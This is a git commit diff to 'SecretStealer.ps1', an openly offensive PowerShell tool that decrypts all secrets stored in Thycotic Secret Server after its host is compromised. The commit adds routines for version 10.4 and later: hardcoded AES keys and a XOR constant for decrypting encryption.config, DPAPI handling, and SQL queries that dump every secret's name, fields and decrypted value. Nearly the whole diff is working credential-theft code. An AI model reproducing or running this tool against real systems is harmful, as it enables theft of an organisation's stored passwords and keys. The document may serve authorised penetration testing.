fc7683db0043401344b2852dcb479cb805d85e86
DoI <denis.andzakovic@gmail.com>
2018-06-19 15:08:36 +1200

    Added v10.4 decryption routines, updated README.md

--- SecretStealer.ps1
+++ SecretStealer.ps1
@@ -22,8 +22,10 @@ The item value's IV from the tbSecretItem table.
 The key from the tbSecrets table.
 .PARAMETER IvMEK
 The IvMEK from the tbSecrets database table.
+.PARAMETER NewFormat
+If specified, use the encryption.config decryption routine for >=v10.4 Secret Server
 .EXAMPLE
-Invoke-SecretDecrypt -EncryptionConfig C:\Users\user\encryption.config -Item 9993c5097491ba2b42a10b9a9b7a6ab7239b107337c348086eeb5f5b29c76f33 -IV CF4C2D4F7FA432D64D9712212A06EEA9 -Key 5C195A500A3BF87C29163A52AC4EA2CFF6C5B69407B6F91A7C7B100B6D20121AAFD052C11B13D542EA2F42137258C2EF -IvMEK 6080667306DA295A75E22667E9AD0376
+Invoke-SecretDecrypt -EncryptionConfig C:\Users\user\encryption.config -Item 9993c5097491ba2b42a10b9a9b7a6ab7239b107337c348086eeb5f5b29c76f33 -ItemIV CF4C2D4F7FA432D64D9712212A06EEA9 -Key 5C195A500A3BF87C29163A52AC4EA2CFF6C5B69407B6F91A7C7B100B6D20121AAFD052C11B13D542EA2F42137258C2EF -IvMEK 6080667306DA295A75E22667E9AD0376
 #>
 
     Param (
@@ -45,19 +47,40 @@ Invoke-SecretDecrypt -EncryptionConfig C:\Users\user\encryption.config -Item 999
 
         [Parameter( Position = 4, Mandatory = $True )]
         [String]
-        $IVMek
+        $IVMek,
+
+        [switch]$NewFormat = $false
     )
 
-    loadDeserializer
+    if($NewFormat){
+        $masterKeys = Get-MasterKeysv104($EncryptionConfig)
+        if(-not $masterKeys){
+            Write-Host "Failed to decrypt encryption.config"
+            return
+        }
+    }
+    else{
+        loadDeserializer
+        $masterKeys = Get-MasterKeys($EncryptionConfig)
+        if(-not $masterKeys){
+            Write-Host "Failed to decrypt encryption.config, may be using the new format. Try adding -NewFormat flag"
+            return
+        }
+    }
 
-    $masterKeys = Get-MasterKeys($EncryptionConfig)
+    if($masterKeys.IsEncryptedWithDPAPI){ 
+        Write-Host "Secret Server configuration uses DPAPI. Use Invoke-SecretStealer on the Secret Server host."
+        return
+    }
+
     $IVMekBytes = Convert-HexStringToByteArray($IVMek);
     $KeyBytes = Convert-HexStringToByteArray $Key
     $ItemIVBytes =  Convert-HexStringToByteArray $ItemIV
     $ItemBytes = Convert-HexStringToByteArray $Item
 
     $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
-    $cryptoTransform = $aes.CreateDecryptor($masterKeys.Get_Item("key256"), $IVMekBytes)
+    $key256 = Convert-HexStringToByteArray($masterKeys.key256);
+    $cryptoTransform = $aes.CreateDecryptor($key256, $IVMekBytes)
     $intermediateKey = $cryptoTransform.TransformFinalBlock($KeyBytes, 0, $KeyBytes.Length)
     
     $intKeyString = [System.BitConverter]::ToString($intermediateKey[0..32])
@@ -89,6 +112,8 @@ after compromising the underlying host.
 .PARAMETER WebRoot
 The path to the Secret Server web root. Normally C:\inetpub\wwwroot\SecretServer
 or similar.
+.PARAMETER NewFormat
+If specified, use the encryption.config decryption routine for >=v10.4 Secret Server
 
 .EXAMPLE
 Invoke-SecretStealer -WebRoot 'C:\inetpub\wwwroot\SecretServer\'
@@ -114,7 +139,11 @@ Invoke-SecretStealer -WebRoot 'C:\inetpub\wwwroot\SecretServer\'
     $dataSet = Invoke-SQL -connectionString $dbConnectionString -sqlCommand "select s.SecretName, f.SecretFieldName, s.[Key], s.IvMEK, i.ItemValue, i.IV from tbSecretItem as i JOIN tbSecret as s ON (s.SecretID = i.SecretID) JOIN tbSecretField as f on (i.SecretFieldID = f.SecretFieldID)";
 
     if ($NewFormat){                    
-        $masterKeys = DecryptNewFormat -webroot $WebRoot
+        $masterKeys = Get-MasterKeysv104 -path $EncryptionConfig
+        if(-not $masterKeys){
+            Write-Host "Failed to decrypt encryption.config"
+            return
+        }
     }else{
         $masterKeys = Get-MasterKeys -path $EncryptionConfig
         if(-not $masterKeys){
@@ -125,9 +154,19 @@ Invoke-SecretStealer -WebRoot 'C:\inetpub\wwwroot\SecretServer\'
     
     $SecretName = $null;
     $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+    
+    if($masterKeys.isEncryptedWithDPAPI){
+        Write-Verbose "Encryption.config values are encrypted with DPAPI, decrypting..."
+        $encryptedValue = $masterKeys.key256
+        $key256 = Convert-HexStringToByteArray(DPAPIDecrypt -base64blob $encryptedValue)
+    }
+    else{
+        $key256 = Convert-HexStringToByteArray($masterKeys.key256);
+    }
+
     foreach($row in $dataSet.Rows){
         if($SecretName -ne $row.SecretName){
-            $cryptoTransform = $aes.CreateDecryptor($masterKeys.Get_Item("key256"), $row.IvMEK)
+            $cryptoTransform = $aes.CreateDecryptor($key256, $row.IvMEK)
             $intermediateKey = $cryptoTransform.TransformFinalBlock($row.key, 0, $row.key.Length)
             $intKeyString = [System.BitConverter]::ToString($intermediateKey[0..32])
             Write-Verbose "Intermediate Key: $intKeyString"
@@ -176,7 +215,99 @@ function Local:Get-MasterKeys{
         throw "Could not retrieve information from encryption.config"
     }
 
-    return @{"key" = Convert-HexStringToByteArray($key); "key256" = Convert-HexStringToByteArray($key256); "iv" = Convert-HexStringToByteArray($iv)}
+    return $master
+}
+
+function Local:Get-MasterKeysv104{
+    Param (
+        [Parameter( Position = 0, Mandatory = $True )]
+        [String]
+        $path
+    )
+
+    $IV = Convert-HexStringToByteArray "ad478c63f93d5201e0a1bbfff0072b6b"
+    $key = Convert-HexStringToByteArray "83fb558645767abb199755eafb4fbc5167113da8ee69f13267388dc3adcdb088"
+
+    <# 
+    Master key decryption for the new version works something like:
+       - Open encryption.config
+       - Read the data after the ASCII file header (+41 bytes)
+       - Decrypt with the hardcoded keys
+       - De-XOR the key count
+       - De-XOR all the key-value pairs with the Magic XOR Value
+       - use the key256 value as the master encryption key
+
+       After the initial decryption, the new Thycotic encryption format looks like:
+       <UINT32 - total keys XOR value><UINT32 - total keys>
+       <UINT32 - key-len xor value><UINT32 - key-len><byte[] key>
+       <UINT32 - value-len xor value><UINT32 - value-len><byte[] value>
+    #>
+
+    $aes = New-Object "System.Security.Cryptography.AesManaged"
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aes.BlockSize = 128
+    $aes.KeySize = 256
+    $aes.Key = $key
+    $aes.IV = $IV
+
+    $bytes = [System.IO.File]::ReadAllBytes($path)
+    $bytes = $bytes[41..$bytes.Length]; # Skip the ASCII file header
+
+    $decryptor = $aes.CreateDecryptor();
+    $encryptionConfig = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    $aes.Dispose()
+
+    $numKeys = [System.BitConverter]::ToInt32($encryptionConfig[1..4],0) -bxor [System.BitConverter]::ToInt32($encryptionConfig[5..8],0);
+    Write-Verbose "encryption.config key count: $numKeys";
+
+    $config = @{}; # hash table to store the config parameters
+    $encPos = 9; # current position in the encryption.config blob
+
+    for($i = 0; $i -lt $numKeys; $i++){
+        # get the key
+        $lengthVal = [System.BitConverter]::ToInt32($encryptionConfig[($encPos+4)..($encPos+7)],0);
+        $lengthXOR = [System.BitConverter]::ToInt32($encryptionConfig[$encPos..($encPos+3)],0);
+        $len = $lengthVal -bxor $lengthXOR
+
+        $key = Get-XORValue $encryptionConfig[($encPos+8)..($encPos+7+$len)]
+        $keyString = [System.Text.Encoding]::Unicode.GetString($key)
+        Write-Verbose "Got encryption.config key: $keyString";
+
+        $encPos += 8+$len # onto the data field
+        
+        # get the value
+        $lengthVal = [System.BitConverter]::ToInt32($encryptionConfig[($encPos+4)..($encPos+7)],0);
+        $lengthXOR = [System.BitConverter]::ToInt32($encryptionConfig[$encPos..($encPos+3)],0);
+        $len = $lengthVal -bxor $lengthXOR
+
+        $value = Get-XORValue $encryptionConfig[($encPos+8)..($encPos+7+$len)]
+        $valueString = [System.Text.Encoding]::Unicode.GetString($value)
+        Write-Verbose "Got encryption.config value: $valueString";
+        
+        $encPos += 8+$len # onto the next entry
+
+        $config.add($keyString,$valueString)
+    }
+    
+    return $config
+}
+
+function Local:Get-XORValue($bytes){
+    $XORMagic = Convert-HexStringToByteArray "8200ab18b1a1965f1759c891e87bc32f208843331d83195c21ee03148b531a0e"
+    $XORPos = 0;
+    $out = New-Object Byte[] $bytes.count
+
+    for($i=0; $i -lt $out.count; $i++){     
+        $out[$i] = $bytes[$i] -bxor $XORMagic[$XORPos]
+        $XORPos++
+        
+        if($XORPos -gt 31){
+            $XORPos = 0
+        }
+    }
+
+    return $out
 }
 
 function Local:DPAPIDecrypt{
@@ -192,10 +323,8 @@ function Local:DPAPIDecrypt{
 
     return $decstr
 }
-
 function Local:DecryptNewFormat{
-    #Imports the new Thycotic.ihawu.EncryptionProtection_x64.dll and uses it to decrypt the encryption.config file.
-    #Not tested on x86 hosts, there's a seperate dll for that arch.
+
     Param (
         [Parameter( Mandatory = $True )]
         [String]
@@ -239,7 +368,10 @@ function Local:Get-DatabaseConnectionString{
     throw "Could not retrieve database connection string from database.config"
 }
 
+# This is the decrypter/deserializer for < SecretServer 10.4 encryption.config files
+# and database.config files for all versions
 function Local:loadDeserializer{
+
     $Assem = ( 
         “System",
         "System.IO",
@@ -376,6 +508,14 @@ function Local:Invoke-SQL {
     
     return $dataSet.Tables
 }
+
+<#
+# Imports the >=v10.4 Thycotic.ihawu.EncryptionProtection_x64.dll and uses it to decrypt the encryption.config file.
+# Not tested on x86 hosts, there's a seperate Thycotic.ihawu.EncryptionProtection_x86.dll for that arch.
+#
+# This interop code has been left in as a fall-back and guide for the Secret Server encryption.config logic.
+# If the encryption.config logic changes with another release, this interop code might end up proving usefull
+#
 
 function Local:LoadEncryptionDll{
 
@@ -546,4 +686,4 @@ Add-Type -ReferencedAssemblies $Assem -TypeDefinition $Source -Language CSharp
 
 
 }
-
+#>
